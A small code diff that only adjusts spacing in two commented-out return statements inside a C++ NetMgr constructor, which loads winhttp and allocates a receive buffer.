@@ -36,7 +36,7 @@ NetMgr::NetMgr() {
 	else {
 		DEBUG_LOG("[!] Failed loading winhttp");
 
-		// return FALSE;
+		//return FALSE;
 	}
 
 	this->RecvBuf = ( PBYTE )kratos->apis.LocalAlloc( ALLOC_ARGS, RECV_INTIAL_SIZE );
@@ -44,7 +44,7 @@ NetMgr::NetMgr() {
 	this->recvLen = 0;
 	this->recvCap = RECV_INTIAL_SIZE;
 
-	// return TRUE;
+	//return TRUE;
 }
 
 
